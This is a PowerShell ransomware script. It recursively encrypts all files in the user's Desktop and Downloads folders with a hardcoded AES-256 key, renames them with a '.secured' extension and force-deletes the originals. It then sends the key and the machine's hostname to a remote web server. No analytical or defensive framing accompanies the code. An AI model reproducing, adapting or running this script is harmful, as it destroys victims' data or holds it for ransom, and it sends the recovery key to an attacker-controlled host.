# Define the AES-256 encryption key (hardcoded)
$key = "12345678901234567890123456789012"  # 32 bytes (256 bits)

# Convert the key to a byte array
$keyBytes = [System.Text.Encoding]::UTF8.GetBytes($key)

# Define the folders to encrypt
$foldersToEncrypt = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads")

# Log file path
$logFilePath = "$env:USERPROFILE\Desktop\encryption_log.txt"

# Function to calculate file hash
function Get-FileHash {
    param (
        [string]$filePath
    )
    if (Test-Path $filePath) {
        try {
            $hash = (Get-FileHash -Algorithm SHA256 -Path $filePath).Hash
            return $hash
        } catch {
            Write-Host "Failed to calculate hash for: $filePath"
            return "N/A"
        }
    }
    return "N/A"
}

# Function to encrypt a file
function Encrypt-File {
    param (
        [string]$filePath,
        [byte[]]$key
    )
    try {
        # Skip already encrypted files
        if ($filePath.EndsWith('.secured')) {
            Write-Host "Skipping already encrypted file: $filePath"
            return
        }

        # Check if the file exists and is accessible
        if (-not (Test-Path $filePath)) {
            Write-Host "File not found: $filePath"
            return
        }

        # Check if the file is readable
        if (-not ([System.IO.File]::Exists($filePath))) {
            Write-Host "File is not accessible: $filePath"
            return
        }

        Write-Host "Starting encryption for: $filePath"

        # Generate a random initialization vector (IV)
        $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
        $aes.Key = $key
        $aes.GenerateIV()
        $iv = $aes.IV

        # Read the file content
        $fileContent = Get-Content -Path $filePath -Encoding Byte -ErrorAction Stop

        # Calculate hash before encryption
        $preEncryptionHash = Get-FileHash -filePath $filePath

        # Encrypt the file content
        $encryptor = $aes.CreateEncryptor()
        $encryptedContent = $encryptor.TransformFinalBlock($fileContent, 0, $fileContent.Length)

        # Write the IV + encrypted content to the file
        $outputContent = $iv + $encryptedContent
        $outputFilePath = "$filePath.secured"
        [System.IO.File]::WriteAllBytes($outputFilePath, $outputContent)

        # Remove the original file
        Remove-Item -Path $filePath -Force -ErrorAction Stop

        # Calculate hash after encryption
        $postEncryptionHash = Get-FileHash -filePath $outputFilePath

        # Log the file details
        Add-Content -Path $logFilePath -Value "File: $filePath"
        Add-Content -Path $logFilePath -Value "Pre-Encryption Hash: $preEncryptionHash"
        Add-Content -Path $logFilePath -Value "Post-Encryption Hash: $postEncryptionHash"
        Add-Content -Path $logFilePath -Value ""

        Write-Host "Encrypted and renamed: $outputFilePath"
    } catch {
        Write-Host "Failed to encrypt: $filePath"
        Write-Host "Error: $_"
    }
}

# Encrypt all files in the specified folders
foreach ($folder in $foldersToEncrypt) {
    if (Test-Path $folder) {
        Get-ChildItem -Path $folder -Recurse -File | Where-Object { !$_.Name.EndsWith('.secured') } | ForEach-Object {
            Encrypt-File -filePath $_.FullName -key $keyBytes
        }
    } else {
        Write-Host "Folder not found: $folder"
    }
}

# Send the encryption key and hostname to the remote Python web server
try {
    $hostname = $env:COMPUTERNAME
    $url = "http://192.168.0.104:8000/store_key"  ## Auto generated // cahnge it for quick testing.
    $body = @{
        key = $key
        hostname = $hostname
    } | ConvertTo-Json

    Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "application/json"
    Write-Host "Encryption key and hostname sent to remote server."
} catch {
    Write-Host "Failed to send encryption key and hostname to remote server."
    Write-Host "Error: $_"
}